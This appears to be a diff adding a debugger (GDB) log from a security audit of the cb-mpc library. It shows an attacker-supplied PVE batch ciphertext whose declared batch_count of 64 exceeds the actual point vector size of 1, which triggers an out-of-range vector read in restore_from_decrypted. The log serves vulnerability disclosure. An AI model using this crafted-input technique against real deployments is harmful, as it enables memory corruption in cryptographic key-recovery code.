@@ -1,0 +1,24 @@
+Breakpoint 1 at 0x14ff60: file /home/user/coinbase-audit/cb-mpc/src/cbmpc/protocol/pve_batch.cpp, line 183.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[victim] ek=271 bytes dk=531 bytes ciphertext=2850 bytes label="cbmpc-pve-backup-label"
+[victim] get_batch_count -> rv=0 batch_count=64
+[victim] calling coinbase::api::pve::decrypt_batch(...)
+
+Breakpoint 1, coinbase::mpc::ec_pve_batch_t::restore_from_decrypted (this=0x7ffff5301340, row_index=0, decrypted_x_buf=..., curve=..., x=std::vector of length 64, capacity 64 = {...}) at /home/user/coinbase-audit/cb-mpc/src/cbmpc/protocol/pve_batch.cpp:183
+183	    if (Q[i] != x[i] * G) return coinbase::error(E_CRYPTO);
+
+==== EVIDENCE: inside ec_pve_batch_t::restore_from_decrypted ====
+loop index i        = 0
+declared n          = 64   (from attacker-supplied outer blob batch_count)
+actual  Q.size()    = 1   (from attacker-supplied inner body)
+Q[0] (in range, valid P-256 point):
+$1 = {curve = {ptr = 0x555555c30400 <coinbase::crypto::p256_info>}, {ptr = 0x5040000053d0, secp256k1 = 0x5040000053d0, storage = 0x5040000053d0}}
+Q[1] (i == 1 will read THIS - past Q.size()):
+$2 = {curve = {ptr = 0x0}, {ptr = 0x0, secp256k1 = 0x0, storage = 0x0}}
+
+Breakpoint 1, coinbase::mpc::ec_pve_batch_t::restore_from_decrypted (this=0x7ffff5301340, row_index=0, decrypted_x_buf=..., curve=..., x=std::vector of length 64, capacity 64 = {...}) at /home/user/coinbase-audit/cb-mpc/src/cbmpc/protocol/pve_batch.cpp:183
+183	    if (Q[i] != x[i] * G) return coinbase::error(E_CRYPTO);
+
+==== second iteration: Q[i] is now read out of range ====
+loop index i        = 1  >= Q.size() = 1  -> out-of-range std::vector::operator[]
